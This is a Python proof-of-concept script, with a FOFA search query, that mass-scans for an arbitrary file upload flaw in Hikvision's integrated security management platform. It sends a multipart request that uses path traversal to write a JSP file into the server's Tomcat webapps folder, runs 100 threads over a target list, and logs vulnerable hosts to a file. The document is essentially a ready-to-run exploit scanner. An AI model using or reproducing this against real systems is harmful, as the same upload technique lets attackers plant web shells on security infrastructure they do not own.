#HiKVISION 综合安防管理平台 files 任意文件上传漏洞 POC
#fofa:app="HIKVISION-综合安防管理平台"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""

██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝                                                         
                                                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="HiKVISION综合安防管理平台files任意文件上传漏洞POC")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/center/api/files;.js"
    headers = {
        'Content-Type':'multipart/form-data;boundary=----WebKitFormBoundaryxxmdzwoe',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_9_3)AppleWebKit/537.36(KHTML,likeGecko)Chrome/35.0.1916.47Safari/537.36',
    }
    data = '------WebKitFormBoundaryxxmdzwoe\r\nContent-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp"\r\nContent-Type:image/jpeg\r\n\r\n<%out.println("pboyjnnrfipmplsukdeczudsefxmywex");%>\r\n------WebKitFormBoundaryxxmdzwoe--'
    try:
        res1 = requests.get(url=target+payload,headers=headers,data=data,verify=False)
        if '../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")          

if __name__ == "__main__":
    main()